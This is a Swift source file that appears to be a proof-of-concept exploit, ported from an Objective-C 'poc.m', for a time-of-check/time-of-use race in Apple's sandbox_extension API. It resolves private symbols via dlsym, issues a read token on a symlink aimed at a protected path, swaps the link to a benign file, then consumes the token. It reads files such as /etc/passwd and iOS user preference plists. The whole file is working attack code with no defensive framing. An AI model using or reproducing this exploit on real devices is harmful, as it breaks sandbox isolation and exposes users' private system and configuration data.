import Foundation

// MARK: - sandbox_extension C API
typealias FnIssue   = @convention(c) (UnsafePointer<CChar>?, UnsafePointer<CChar>?, UInt64) -> UnsafeMutablePointer<CChar>?
typealias FnConsume = @convention(c) (UnsafePointer<CChar>?) -> Int64
typealias FnRelease = @convention(c) (Int64) -> Void

private let RTLD_DEFAULT = UnsafeMutableRawPointer(bitPattern: -2)

struct ReadResult {
    let path: String
    let bytes: Int
    let preview: String
    let success: Bool
    let error: String?
}

enum TOCTOUPoC {

    // The exact paths from poc.m
    static let defaultTargets: [String] = [
        "/etc/passwd",
        "/etc/group",
        "/etc/hosts",
        "/etc/protocols",
        "/etc/services",
        "/var/mobile/Library/Preferences/.GlobalPreferences.plist",
        "/var/mobile/Library/UserConfigurationProfiles/PublicInfo/PublicEffectiveUserSettings.plist",
        "/var/preferences/com.apple.networkd.plist"
    ]

    private static func loadSymbols() -> (FnIssue, FnConsume, FnRelease)? {
        guard let sIssue   = dlsym(RTLD_DEFAULT, "sandbox_extension_issue_file"),
              let sConsume = dlsym(RTLD_DEFAULT, "sandbox_extension_consume"),
              let sRelease = dlsym(RTLD_DEFAULT, "sandbox_extension_release")
        else { return nil }
        return (unsafeBitCast(sIssue,   to: FnIssue.self),
                unsafeBitCast(sConsume, to: FnConsume.self),
                unsafeBitCast(sRelease, to: FnRelease.self))
    }

    /// Direct port of poc.m's `r()` function.
    /// Swap symlink → issue token on attack path → swap back → consume → read.
    static func read(targetPath: String,
                     workDir: URL,
                     onLog: @escaping (String) -> Void) -> ReadResult {

        guard let (issue, consume, release) = loadSymbols() else {
            return ReadResult(path: targetPath, bytes: 0, preview: "",
                              success: false, error: "sandbox_extension symbols missing")
        }

        let stagePath = workDir.appendingPathComponent("s")
        let linkPath  = workDir.appendingPathComponent("l")
        let stageC = stagePath.path
        let linkC  = linkPath.path
        let targetC = targetPath

        let fm = FileManager.default

        // 1) seed the staging file
        if !fm.fileExists(atPath: stageC) {
            fm.createFile(atPath: stageC, contents: Data("x".utf8))
        }

        // 2) point symlink at the ATTACK target, issue token
        unlink(linkC)
        guard symlink(targetC, linkC) == 0 else {
            return ReadResult(path: targetPath, bytes: 0, preview: "",
                              success: false, error: "symlink(target) failed: \(errno)")
        }

        let cls = strdup("com.apple.app-sandbox.read")!
        defer { free(cls) }

        let tokenPtr: UnsafeMutablePointer<CChar>? = linkC.withCString { lp in
            issue(cls, lp, 0)
        }
        guard let token = tokenPtr else {
            unlink(linkC)
            return ReadResult(path: targetPath, bytes: 0, preview: "",
                              success: false, error: "issue_file NULL (class denied)")
        }

        // 3) TOCTOU: swap symlink back to benign staging path
        unlink(linkC)
        if symlink(stageC, linkC) != 0 {
            onLog("swap-back symlink failed: \(errno)")
        }

        // 4) consume token — now authorizes the ORIGINAL attack target
        let handle = consume(token)
        free(token)

        // 5) read through the (now-innocent-looking) link
        var result: ReadResult
        do {
            let data = try Data(contentsOf: URL(fileURLWithPath: linkC))
            if data.isEmpty {
                result = ReadResult(path: targetPath, bytes: 0, preview: "",
                                    success: false, error: "empty read")
            } else {
                let head = data.prefix(100)
                let preview = String(data: head, encoding: .utf8)?
                    .replacingOccurrences(of: "\n", with: "\\n") ?? "(binary)"
                result = ReadResult(path: targetPath,
                                    bytes: data.count,
                                    preview: preview,
                                    success: true,
                                    error: nil)
                onLog("[+] \(targetPath) — \(data.count) bytes — \(preview)")
            }
        } catch {
            result = ReadResult(path: targetPath, bytes: 0, preview: "",
                                success: false, error: error.localizedDescription)
            onLog("[-] \(targetPath): \(error.localizedDescription)")
        }

        if handle > 0 { release(handle) }
        unlink(linkC)
        unlink(stageC)
        return result
    }

    /// Runs every default path. Matches `main()` in poc.m.
    static func runAll(onLog: @escaping (String) -> Void,
                       onResult: @escaping (ReadResult) -> Void) {
        let workDir = FileManager.default.temporaryDirectory
            .appendingPathComponent("toctou", isDirectory: true)
        try? FileManager.default.createDirectory(at: workDir, withIntermediateDirectories: true)

        onLog("[*] sandbox_extension TOCTOU running…")
        for p in defaultTargets {
            let r = read(targetPath: p, workDir: workDir, onLog: onLog)
            onResult(r)
        }
        onLog("[*] done")
    }
}
